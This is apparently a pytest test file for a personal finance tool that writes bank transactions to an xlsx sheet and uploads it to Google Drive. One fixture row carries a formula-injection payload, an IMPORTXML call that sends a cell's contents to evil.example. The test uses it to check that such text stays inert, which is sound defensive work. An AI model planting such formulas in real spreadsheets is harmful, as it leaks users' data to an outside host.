import io
import json
import zipfile
from datetime import UTC, date, datetime

import httpx
import pytest
from finance import sheet
from finance.__main__ import health, record
from openpyxl import load_workbook

GOOGLE = {"CLIENT_ID": "id", "CLIENT_SECRET": "secret", "REFRESH_TOKEN": "refresh"}
ROWS = [
    (
        12,
        date(2026, 10, 3),
        -1250,
        '=IMPORTXML("https://evil.example/?"&A1, "//a")',
        "Uncategorised",
        "spend",
        None,
        "personal",
        "Monzo Personal",
        None,
        "",
        None,
        "+44 SENT FROM",
        "booked",
        datetime(2026, 10, 3, 22, 5, tzinfo=UTC),
    )
]


def test_text_from_the_bank_never_becomes_a_formula():
    data = sheet.workbook(ROWS)
    with zipfile.ZipFile(io.BytesIO(data)) as xlsx:
        assert "<f>" not in xlsx.read("xl/worksheets/sheet1.xml").decode()
    entries = load_workbook(io.BytesIO(data))["Entries"]
    assert [c.value for c in entries[1]][:4] == ["Ref", "Date", "Amount £", "Merchant"]
    row = [c.value for c in entries[2]]
    assert row[0] == 12 and row[1].date() == date(2026, 10, 3) and row[2] == pytest.approx(-12.50)
    assert row[3].startswith("=IMPORTXML") and entries.cell(2, 4).data_type == "s"
    assert row[7] == "personal" and row[12] == "+44 SENT FROM"
    assert row[14].isoformat() == "2026-10-03T23:05:00"  # London
    assert entries.freeze_panes == "A2"


class Drive:
    """Google's token endpoint and Drive's upload endpoint, as far as the export uses them."""

    def __init__(self, update_status: int = 200, create_status: int = 200):
        self.update_status, self.create_status = update_status, create_status
        self.calls: list[tuple[str, str]] = []

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.calls.append((request.method, request.url.path))
        if request.url.host == "oauth2.googleapis.com":
            assert b"grant_type=refresh_token" in request.content
            return httpx.Response(200, json={"access_token": "token"})
        assert request.headers["Authorization"] == "Bearer token"
        if request.method == "PATCH":
            assert request.headers["Content-Type"] == sheet.XLSX
            return httpx.Response(self.update_status, json={"id": "old"})
        assert b'"mimeType": "application/vnd.google-apps.spreadsheet"' in request.content
        return httpx.Response(self.create_status, json={"id": "new"})


class Conn:
    def execute(self, sql):
        assert sql == sheet.QUERY
        return self

    def fetchall(self):
        return ROWS


def export(drive: Drive, known: str | None):
    with httpx.Client(transport=httpx.MockTransport(drive)) as http:
        return sheet.export(Conn(), http, GOOGLE, known)  # pyright: ignore[reportArgumentType]


def test_the_sheet_is_created_once_then_replaced_in_place():
    drive = Drive()
    assert export(drive, None) == ("new", 1)
    assert drive.calls[-1] == ("POST", "/upload/drive/v3/files")
    assert export(drive, "old") == ("old", 1)
    assert drive.calls[-1] == ("PATCH", "/upload/drive/v3/files/old")


def test_a_deleted_sheet_is_created_again():
    drive = Drive(update_status=404)
    assert export(drive, "old") == ("new", 1)
    assert [m for m, _ in drive.calls] == ["POST", "PATCH", "POST"]


def test_failures_name_the_status_only():
    with pytest.raises(sheet.SheetError, match=r"^Drive refused the update \(HTTP 403\)$"):
        export(Drive(update_status=403), "old")


@pytest.fixture
def state(tmp_path, monkeypatch):
    for name, value in (
        ("STATE", tmp_path),
        ("CONNECTIONS", tmp_path / "connections.json"),
        ("STATUS", tmp_path / "status.json"),
    ):
        monkeypatch.setattr(f"finance.__main__.{name}", value)
    return tmp_path


def test_health_reports_a_sheet_that_stopped_updating(state):
    record("sheet", last_ok="2026-10-13T07:01:00+00:00")
    record("sheet", error_at="2026-10-13T15:01:00+00:00", last_error="Drive refused the update (HTTP 403)")
    assert health(datetime(2026, 10, 13, 16, tzinfo=UTC)) == [
        "Google Sheet copy not updated: Drive refused the update (HTTP 403)"
    ]
    record("sheet", last_ok="2026-10-13T23:01:00+00:00")
    assert health(datetime(2026, 10, 13, 23, 30, tzinfo=UTC)) == []
    assert json.loads((state / "status.json").read_text())["sheet"]["last_ok"].startswith("2026-10-13T23")
